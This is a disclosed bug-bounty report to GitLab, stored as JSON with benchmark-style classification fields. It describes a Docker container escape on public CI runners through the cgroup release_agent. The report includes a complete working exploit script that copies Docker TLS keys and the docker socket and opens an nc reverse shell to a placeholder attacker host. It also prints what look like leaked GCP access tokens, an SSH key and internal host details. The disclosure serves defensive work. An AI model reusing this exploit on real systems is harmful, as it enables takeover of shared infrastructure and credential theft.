{
  "reported_to": "GitLab",
  "reported_by": "ec0 ",
  "title": "Container escape on public GitLab CI runners",
  "content": "\nSummary\nIt is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.\nThis is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.\nFrom this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.\nSteps to reproduce\nSign up for a regular, free GitLab account.\nCreate a new project. An example repo is here: https://gitlab.com/ec0bb/citest (made private)\nAdd the below .gitlab-ci.yaml\nCode 55 Bytes\n1image: python:latest\n2run:\n3  script:\n4    - bash shell.sh\nAdd the below shell.sh\nCode 900 Bytes\n1export HOST=your.reverse.shell.box # customise this!\n2\n3mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n4echo 1 > /tmp/cgrp/x/notify_on_release\n5export host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n6echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n7\n8touch /user/txt\n9touch /ca.pem\n10touch /server.pem\n11touch /server-key.pem\n12touch /ps.txt\n13echo '#!/bin/sh' > /cmd\n14echo \"whoami > $host_path/user.txt\" >> /cmd\n15echo \"ps uax > $host_path/ps.txt\" >> /cmd\n16echo \"cat /etc/docker/ca.pem > $host_path/ca.pem\" >> /cmd\n17echo \"cat /etc/docker/server.pem > $host_path/server.pem\" >> /cmd\n18echo \"cat /etc/docker/server-key.pem > $host_path/server-key.pem\" >> /cmd\n19echo \"mount -o bind /var/run/docker.sock $host_path/docker.sock\" >> /cmd\n20echo \"/usr/bin/nc $HOST 1337 -e /bin/sh &\" >> /cmd\n21chmod a+x /cmd\n22\n23while test 1\n24do\n25  sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n26  sleep 60\n27done\nPush the files to the repository.\nEnable CI/CD jobs on the repository, in case they aren't, using the .gitlab-ci.yml in the repository.\nSet up a reverse shell listener with nc -lvp 1337 on the host you specified in the bash script above.\nRun the job\nImpact\nBased on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured.\nBeing able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network. It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.\nI did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.\nExamples\nRepo: https://gitlab.com/ec0bb/citest\nGCP access (albeit limited) -\nCode 5.42 KiB\n1curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n2{\"access_token\":\"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI\",\"expires_in\":3326,\"token_type\":\"Bearer\"}\n3\n4ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk\n5token bb\n6\n7\n8\n9\n10instance/attributes/cos-update-strategy update_disabled\n11instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W\n12humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe\n13FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT\n14zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T\n15n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor\n16wID4cGmMb0Av cos\n17\n18instance/attributes/user-data #cloud-config\n19\n20write_files:\n21- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf\n22  permissions: 0644\n23  owner: root\n24  content: |\n25    [Service]\n26    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8\n27\n28- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf\n29  permissions: 0644\n30  owner: root\n31  content: |\n32    [Unit]\n33    Wants=network-online.target containerd.service iptables-restore.service\n34:\n35- path: /etc/systemd/system.conf\n36  permissions: 0644\n37  owner: root\n38  content: |\n39    [Manager]\n40    # Defaults from Google Container Optimized OS\n41    DefaultCPUAccounting=yes\n42    DefaultBlockIOAccounting=yes\n43    # Our custom timeout to speed-up VM shutdown\n44    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#\n45note_632590419\n46    DefaultTimeoutStopSec=5s\n47\n48- path: /var/lib/cloud/scripts/per-boot/00-enable-swap\n49  permissions: 0755\n50  owner: root\n51  content: |\n52    #!/usr/bin/env sh\n53\n54    sysctl vm.disk_based_swap=1\n55    fallocate -l 2G /var/swapfile\n56    chmod 600 /var/swapfile\n57    mkswap /var/swapfile\n58    swapon /var/swapfile\n59\n60- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl\n61  permissions: 0755\n62  owner: root\n63  content: |\n64    #!/usr/bin/env sh\n65\n66    # Required for Elasticsearch docker images to function:\n67    # https://gitlab.com/gitlab-com/infrastructure/issues/1687\n68    sysctl vm.max_map_count=262144\n69\n70    # Swap is available, but not preferred\n71    sysctl vm.swappiness=10\n72\n73instance/cpu-platform Intel Haswell\n74instance/description docker host vm\n75instance/disks/0/device-name persistent-disk-0\n76instance/disks/0/index 0\n77instance/disks/0/interface SCSI\n78instance/disks/0/mode READ_WRITE\n79instance/disks/0/type PERSISTENT\n80instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr\n81ee-6-f2de7a.internal\n82instance/id 8450900684160343118\n83instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210\n84720-0\n85instance/legacy-endpoint-access/0.1 0\n86instance/legacy-endpoint-access/v1beta1 0\n87instance/licenses/0/id 6880041984096540132\n88instance/licenses/1/id 1001010\n89instance/licenses/2/id 166739712233658766\n90instance/machine-type projects/745008255720/machineTypes/n1-standard-1\n91instance/maintenance-event NONE\n92instance/name runner-jlguopmm-shared-1641423520-3feb5440\n93instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50\n94instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT\n95instance/network-interfaces/0/dns-servers 169.254.169.254\n96instance/network-interfaces/0/gateway 10.10.8.1\n97instance/network-interfaces/0/ip 10.10.10.75\n98instance/network-interfaces/0/mac 42:01:0a:0a:0a:4b\n99instance/network-interfaces/0/mtu 1460\n100instance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r\n101unners\n102instance/network-interfaces/0/subnetmask 255.255.248.0\n103instance/preempted FALSE\n104instance/remaining-cpu-time -1\n105instance/scheduling/automatic-restart TRUE\n106instance/scheduling/on-host-maintenance MIGRATE\n107instance/scheduling/preemptible FALSE\n108instance/service-accounts/default/aliases default\n109instance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f\n1102de7a.iam.gserviceaccount.com\n111instance/service-accounts/default/scopes https://www.googleapis.com/auth/logging\n112.write\n113instance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor\n114ing.write\n115instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\n116viceaccount.com/aliases default\n117instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\n118viceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice\n119account.com\n120instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\n121viceaccount.com/scopes https://www.googleapis.com/auth/logging.write\n122instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\n123viceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write\n124instance/tags docker-machine\n125instance/virtual-clock/drift-token 0\n126instance/zone projects/745008255720/zones/us-east1-c\n127project/attributes/disable-legacy-endpoints TRUE\n128project/attributes/serial-port-logging-enable false\n129project/numeric-project-id 745008255720\n130project/project-id gitlab-ci-plan-free-6-f2de7a\n131\n132computeMetadata/v1/instance/service-accounts/default/scopes \\  \n133>     -H 'Metadata-Flavor:Google'\n134https://www.googleapis.com/auth/logging.write\n135https://www.googleapis.com/auth/monitoring.write\ndocker access\nCode 1013 Bytes\n1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps\n2CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES\n3a40074c0d2c5        a5d7930b60cc                                               \"sh -c 'if [ -x /usr\u2026\"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2\n48c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         \"go-wrapper run\"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup\n5fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   \"/sbin/init\"             5 months ago        Up 26 minutes                           suricata\n617e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    \"/bin/node_exporter \u2026\"   5 months ago        Up 26 minutes                           node-exporter\nrunner TLS keys for communicating with the runner manager (also used for logstash auth)\nCode 205 Bytes\n1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*\n2runner.ca.crt:     PEM certificate\n3runner.client.crt: PEM certificate\n4runner.client.key: PEM RSA private key\nImpact\nUnconfined remote code execution on CI host machines\nAccess to GCP API\nAccess to internal GCP network\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1651072320,
  "report_url": "https://hackerone.com/reports/1442118",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Sign up for a regular, free GitLab account."
    ],
    [
      2,
      "Create a new project and add the provided .gitlab-ci.yaml and shell.sh files."
    ],
    [
      3,
      "Push the files to the repository and enable CI/CD jobs."
    ],
    [
      4,
      "Set up a reverse shell listener on the specified host."
    ],
    [
      5,
      "Run the job to trigger the container escape."
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to escape the Docker container isolation on public GitLab CI runners by abusing the cgroup release_agent functionality. This leads to unconfined remote code execution on the host machine, access to GCP API, and internal network resources.",
  "reason": "The attack involves multiple components (cgroup manipulation, filesystem mounting, reverse shell setup) and requires understanding of Docker internals and cgroup functionality. The interaction between these components is non-obvious, and the attack manipulates complex system states to achieve container escape.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": false,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves escaping a container via cgroup manipulation and accessing the host system, which is an infrastructure misconfiguration and privilege escalation rather than an application-level authorization flaw. The proposed methodologies focus on testing AuthN/AuthZ boundaries within application logic (e.g., session/resource ID swaps), while this exploit abuses container isolation mechanisms and host access controls, making it unrelated to user session/resource authorization checks.",
    "is_simple_authnz": false
  }
}